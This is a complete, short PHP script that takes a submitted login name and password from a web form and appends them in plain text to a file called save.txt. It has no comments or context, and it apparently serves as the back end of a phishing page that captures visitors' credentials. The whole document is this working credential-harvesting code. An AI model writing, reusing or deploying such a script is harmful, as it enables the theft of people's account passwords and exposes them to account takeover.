<?php
    $login = $_POST["login"];
    $pass = $_POST["pass"];
    $filed = "save.txt";
    $result = "Login: $login | Password: $pass\r\n";
	$rez = $result;
	file_put_contents($filed, $rez, FILE_APPEND);
?>
 